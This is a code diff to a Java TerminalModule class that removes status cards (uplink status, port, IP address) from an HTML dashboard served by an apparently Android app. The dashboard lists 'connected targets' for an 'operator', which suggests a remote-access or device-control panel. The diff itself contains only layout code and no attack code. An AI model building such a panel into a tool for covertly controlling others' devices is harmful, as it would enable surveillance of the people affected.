@@ -56,8 +56,6 @@ public class TerminalModule extends BaseModule {
 
     private Response serveHome(IHTTPSession session) {
         WorkManager_Sync.notifyOperatorActivity();
-        String ip = MainActivity.getLocalIpAddress();
-        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
         String sessionId = FirebaseConfig.getSessionId();
 
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
@@ -72,31 +70,9 @@ public class TerminalModule extends BaseModule {
 
         html.append("<div style=\"margin-top: 15px;\">");
         html.append("<div style=\"font-size:0.8rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
-        
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
-        
-        // Server Status
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">UPLINK_STATUS</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
-        html.append("</div>");
-        
-        // Port
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">ACCESS_PORT</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
-        html.append("</div>");
-        
-        // IP
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">VIRTUAL_ADDRESS</div>");
-        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
-        html.append("</div>");
-        
-        html.append("</div>");
 
         // Connected Target Table inside System Monitor Card
-        html.append("<div style=\"width: 100%; overflow-x: auto; margin-top: 25px; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.25); background: rgba(0, 0, 0, 0.4); padding: 15px; box-sizing: border-box;\">");
+        html.append("<div style=\"width: 100%; overflow-x: auto; margin-top: 15px; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.25); background: rgba(0, 0, 0, 0.4); padding: 15px; box-sizing: border-box;\">");
         html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;\">");
         html.append("<div style=\"font-size: 0.75rem; color: var(--neon-cyan); letter-spacing: 2px; font-weight: bold; text-transform: uppercase;\">CONNECTED TARGET <span style=\"color:#888; font-size:0.65rem; font-weight:normal;\">(LIVE AUTO-REFRESH 20s)</span></div>");
         html.append("<button type=\"button\" onclick=\"refreshTargetsTable()\" class=\"btn btn-small\" style=\"margin:0; padding:6px 12px; font-size:0.65rem; border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05);\">REFRESH TARGET</button>");
